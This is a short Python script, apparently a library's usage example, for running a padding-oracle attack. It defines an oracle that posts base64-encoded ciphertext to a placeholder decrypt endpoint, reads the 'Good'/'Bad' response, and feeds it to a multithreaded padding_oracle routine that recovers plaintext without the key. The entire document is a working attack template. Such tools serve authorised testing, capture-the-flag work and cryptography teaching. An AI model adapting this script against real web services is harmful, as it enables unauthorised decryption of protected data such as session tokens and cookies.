from padding_oracle import *

import requests

# Create a requests.Session to enable connection pool
sess = requests.Session()

# Define a function to test if the cipher can be decrypted
def oracle(cipher):
    resp = sess.post('http://some-website.com/decrypt',
                     data={'cipher': base64_encode(cipher)}).text
    assert 'Good' in resp or 'Bad' in resp, 'Exception?'
    return 'Good' in resp


cipher = b'[______IV______][____Block1____][____Block2____]'


# DECRYPT THE CIPHER!!!
plaintext = padding_oracle(cipher,
                           block_size=16,
                           oracle=oracle,
                           num_threads=64)
